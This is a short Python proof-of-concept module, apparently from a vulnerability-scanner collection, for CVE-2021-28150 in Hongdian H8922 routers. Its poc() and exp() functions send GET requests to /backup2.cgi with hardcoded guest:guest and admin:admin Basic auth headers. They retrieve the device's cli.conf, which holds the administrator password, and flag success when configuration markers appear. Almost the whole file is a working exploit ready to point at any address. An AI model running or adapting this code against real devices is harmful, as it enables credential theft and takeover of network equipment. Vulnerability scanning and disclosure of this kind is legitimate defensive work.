import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Hongdian Sensitive Information''',
        "description": '''Hongdian H8922 3.0.5 devices allow the unprivileged guest user to read cli.conf (with the administrator password and other sensitive data) via /backup2.cgi.''',
        "severity": "medium",
        "references": [
            "https://ssd-disclosure.com/ssd-advisory-hongdian-h8922-multiple-vulnerabilities/", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-28150"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2021-28150",
            "cwe-id": "CWE-20"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "hongdian", "exposure"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/backup2.cgi"""
        method = "GET"
        data = """"""
        headers = {'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q='}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/backup2.cgi"""
        method = "GET"
        data = """"""
        headers = {'Authorization': 'Basic YWRtaW46YWRtaW4='}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp1.status_code == 200) and ("""application/octet-stream""" in str(resp1.headers)) and ("""CLI configuration saved from vty""" in resp1.text and """service webadmin""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url